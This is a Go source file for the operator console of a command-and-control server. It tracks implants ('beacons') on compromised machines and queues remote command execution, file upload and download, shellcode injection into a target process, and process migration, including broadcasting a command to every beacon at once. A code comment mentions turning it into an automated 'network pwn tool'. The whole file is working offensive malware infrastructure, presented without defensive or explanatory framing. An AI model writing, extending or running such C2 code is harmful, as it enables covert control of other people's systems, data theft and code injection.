package main

import (
	"os"
	"net"
	"fmt"
	"time"
	"bufio"
	"strconv"
	"strings"
	"math/rand"
	"io/ioutil"
	"encoding/json"
	"encoding/base64"
)

type CommandUpdate struct {
	Ip string
	Id string
	User string
	Platform string
	Arch string
	Pid string
	Pname string
	Type string
	Data string
}

type Beacon struct {
	Ip string
	Id string
	User string
	Platform string
	Arch string
	Pid string
	Pname string
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string	
	ShellcodeBuffer []string
	ProxyClientBuffer []string
	LastSeen time.Time
}

const idBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var idLen int = 8
var listeners []*HttpListener = make([]*HttpListener, 0)
var beacons []*Beacon = make([]*Beacon, 0)
var activeBeacon *Beacon
var activeBeaconInteractive = false
var cmdArgs = map[string]string {
    "help": "<command>...",
	"list": "",
	"listeners": "",
	"httplistener": "<iface> <hostname> <port>",
    "exec": "<beacon id OR index> <command>...",
    "create": "<listener>",
	"download": "<beacon id OR index> <remote file> OR <remote file>...",
	"upload": "<beacon id OR index> <local file> OR <local file>...",
	"use": "<beacon id OR index>",
	"script": "<beacon id OR index> <local file path> <remote executor path>",
	// beacon commands
	"shellcode": "<path to shellcode> <PID>",
	"migrate": "<PID>",
	"plist": "",
}

/*


potentially turn into automated network pwn tool?


*/

func getIfaceIp(iface string) (string) {
	ief, _ := net.InterfaceByName(iface)
	addrs, _ := ief.Addrs()
	return strings.Split(addrs[0].String(), "/")[0]
}

func registerBeacon(updateData CommandUpdate) (*Beacon) {
	var beacon *Beacon
	for _, b := range beacons {
		if b.Id == updateData.Id && b.Ip == updateData.Ip {
			b.Ip = updateData.Ip
			beacon = b 
		}
	}

	if beacon == nil || beacon.Ip == "n/a" {
		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
		webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"New Beacon", updateData.Id + "@" + updateData.Ip})
		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, time.Now() }
		beacons = append(beacons, beacon)
	} else {
		beacon.LastSeen = time.Now()
	}

	return beacon
}

func convertTime(t time.Duration) (string) {
	return fmt.Sprintf("%d", int(t.Hours())) + ":" + fmt.Sprintf("%d", int(t.Minutes())) + ":" + fmt.Sprintf("%.2fs", t.Seconds())
}

func listBeacons() {
	header := "#\tID\t\tUser\t\tIP\t\tProcess\t\tPlatform\tArch\tLast Seen\n" +
				   "---------------------------------------------------------------------------------------------------------"
	formatString := "%d\t%-12s\t%-15s\t%-15s\t%-15s\t%-8s\t%-5s\t%-15s\n"
	
	fmt.Println(header)
	for i, b := range beacons {
		diff := time.Now().Sub(b.LastSeen)
		status := convertTime(diff)
		if b.LastSeen.Year() == 1 {
			status = " has not checked in yet."
		}

		fmt.Printf(formatString, i, b.Id, b.User, b.Ip, b.Pname, b.Platform, b.Arch, status)
	}
}

func genRandID() string {
	rand.Seed(time.Now().UTC().UnixNano())
    b := make([]byte, idLen)
    
	for i := range b {
        b[i] = idBytes[rand.Intn(len(idBytes))]
    }
    
	return string(b)
}

func execOnBeacon(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.ExecBuffer = append(b.ExecBuffer, strings.Join(cmd[2:], " "))
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		if (len(cmd) > 2 && cmd[2] == "-i") || (len(cmd) == 2 && activeBeacon != nil && cmd[1] == "-i") {
			activeBeaconInteractive = true
			activeBeacon = beacon
			return
		} else {
			beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
			fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
		}
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func downloadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.DownloadBuffer = append(b.DownloadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.DownloadBuffer = append(beacon.DownloadBuffer, cmd[cmdIndex])
		fmt.Println("Added download command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func uploadFile(cmd []string) {
	if cmd[1] == "*" {
		for _, b := range beacons {
			b.UploadBuffer = append(b.UploadBuffer, cmd[2])
		}
		return	
	}

	var beacon *Beacon = activeBeacon
	var cmdIndex = 1
	if beacon == nil {
		beacon = getBeaconByIdOrIndex(cmd[1])
		cmdIndex = 2
	}

	if beacon != nil {
		beacon.UploadBuffer = append(beacon.UploadBuffer, cmd[cmdIndex])
		fmt.Println("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
	} else {
		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
	}
}

func getBeaconByIdOrIndex(id string) (*Beacon) {
	var beacon *Beacon

	for _, b := range beacons {
		if b.Id == id {
			beacon = b
		}
	}

	bId, err := strconv.Atoi(id)
	
	if beacon != nil || (err == nil && bId < len(beacons)) {
		if beacon == nil {
			beacon = beacons[bId]
		}
		return beacon
	} else {
		return nil
	}
}

func checkArgs(cmd[] string) (bool) {
	if cmdArgs[cmd[0]] == "" {
		return true
	}

	amt := strings.Count(cmdArgs[cmd[0]], "<")
	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
		if amt == 1 {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
		} else {
			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
		}
		return false
	}
	return true
}

func printHelp(cmd []string) {
	if len(cmd) == 2 {
		if val, ok := cmdArgs[cmd[1]]; ok {
			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
		} else {
			fmt.Println("Command " + cmd[0] + " does not exist.")
		}
	} else {
		for key, val := range cmdArgs {
			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
		}
	}
}

func startHttpListener(cmd []string) {
	port, err := strconv.Atoi(cmd[3])

	if err != nil {
		fmt.Println("usage: " + cmdArgs["httplistener"])
		return
	}

	var HttpListener = HttpListener {
		Iface: cmd[1],
		Hostname: cmd[2],
		Port: port,
	}

	err = HttpListener.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	fmt.Println("Started HTTP listener for " + getIfaceIp(HttpListener.Iface) + ":" + cmd[3])
	listeners = append(listeners, &HttpListener)
}

func listListeners() {
	fmt.Println("---- HTTP Listeners ----")
	for i, listener := range listeners {
		fmt.Println("[" + strconv.Itoa(i) + "] " + getIfaceIp(listener.Iface) + ":" + strconv.Itoa(listener.Port) + " (" + listener.Iface + ")")
	}
}

func migrateBeacon(cmd []string) {
	if activeBeacon == nil {
		fmt.Println("Interact with a beacon first (use).")
		return
	}

	filename := "out/" + activeBeacon.Id
	
	if activeBeacon.Platform == "windows" {
		filename += ".exe"
	}

	filename += ".bin"

	if _, err := os.Stat(filename); os.IsNotExist(err) {
		fmt.Println("File does not exist.")
		return
	}

	f, _ := os.Open(filename)
    reader := bufio.NewReader(f)
    content, _ := ioutil.ReadAll(reader)
    encoded := base64.StdEncoding.EncodeToString(content)
	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "migrate " + cmd[1])
}

func injectShellcode(cmd []string) {
	if activeBeacon == nil {
		fmt.Println("Interact with a beacon first (use).")
		return
	}

	if _, err := os.Stat(cmd[1]); os.IsNotExist(err) {
		fmt.Println("File does not exist.")
		return
	}

	fmt.Println(cmd[0], cmd[1])
	f, _ := os.Open(cmd[1])
    reader := bufio.NewReader(f)
    content, _ := ioutil.ReadAll(reader)
    encoded := base64.StdEncoding.EncodeToString(content)
	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "local " + cmd[2])
}

func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", "", "", nil, nil, nil, nil, nil, time.Now() }
	data, err := json.Marshal(pseudoBeacon)
	
	if err != nil {
		fmt.Println("Failed to notify beacon of proxy update.")
		return
	}

	proxy.ProxyClientBuffer = append(proxy.ProxyClientBuffer, string(data))
}

func processInput(input string) {
	cmd := strings.Fields(input);
	
	if len(cmd) > 0 && checkArgs(cmd) {
		if activeBeaconInteractive {
			if activeBeacon == nil {
				activeBeaconInteractive = false
			} else {
				if cmd[0] == "exit" {
					activeBeaconInteractive = false
				} else {
					execOnBeacon(append([]string{"exec"}, cmd...))
				}
			}
		} else {
			switch cmd[0] {
			//case "script":
				//uploadAndExec(cmd)
			case "listeners":
				listListeners()
			case "httplistener":
				startHttpListener(cmd)
			case "exec":
				execOnBeacon(cmd)
			case "create":
				l, err := strconv.Atoi(cmd[1])
				if err != nil {
					fmt.Println("usage: " + cmdArgs["create"])
					return
				}
				if len(listeners) <= l || l < 0 {
					fmt.Println("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
					return
				}
				createBeacon(l)
			case "list":
				listBeacons()
			case "upload":
				uploadFile(cmd)
			case "download":
				downloadFile(cmd)
			case "use":
				activeBeacon = getBeaconByIdOrIndex(cmd[1])
				if activeBeacon == nil {
					fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
				}
			case "shellcode":
				injectShellcode(cmd)
			case "migrate":
				migrateBeacon(cmd)
			case "help":
				printHelp(cmd)
			case "plist":
				if activeBeacon != nil {
					execOnBeacon(append(cmd, "plist"))
				} else {
					fmt.Println("Interact with a beacon first (use).")
				}
			default:
				fmt.Println(cmd[0] + " is not a command. Use help to show available commands.")
			}
		}
	}
}

func prompt() {
	if activeBeacon != nil {
		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
		if activeBeaconInteractive {
			fmt.Print("(i) ")
		}
	}

	fmt.Print("c2> ")
}

func handleInput() {
	reader := bufio.NewReader(os.Stdin)
	for {
		prompt()
		input, err := reader.ReadString('\n')

        if err != nil {
            fmt.Fprintln(os.Stderr, err)
        }

		processInput(input)
	}
}

func main() {
	var WebInterface = WebInterface {
		port: 8000,
	}

	var err = WebInterface.startListener()
	if err != nil {
		fmt.Println("Failed to start web interface.")
	}

	//var HttpListenerTun0 = HttpListener {
//		Iface: "tun0",
//		Hostname: "command.com",
//		Port: 8001,
//	}

	var HttpListenerLocalhost = HttpListener {
		Iface: "enp0s20f0u1",
		Hostname: "command.com",
		Port: 8000,
	}

	//err = HttpListenerTun0.startListener()
	//if err != nil {
	//	fmt.Println("Failed to start http server.")
	//}

	err = HttpListenerLocalhost.startListener()
	if err != nil {
		fmt.Println("Failed to start http server.")
	}

	//listeners = append(listeners, &HttpListenerTun0)
	listeners = append(listeners, &HttpListenerLocalhost)

	go func() {
		for {
			rescueStdout := os.Stdout
			stdOutHook, wr, _ := os.Pipe()
			os.Stdout = wr
			time.Sleep(time.Millisecond * 20)
			wr.Close()
			out, _ := ioutil.ReadAll(stdOutHook)
			os.Stdout = rescueStdout
			
			if(len(out) > 0) {
				stdOutBuffer = append(stdOutBuffer, []byte(strings.ReplaceAll(string(out), "c2> ", ""))...)
				fmt.Print(string(out))
			}
		}
	}()

	handleInput()
}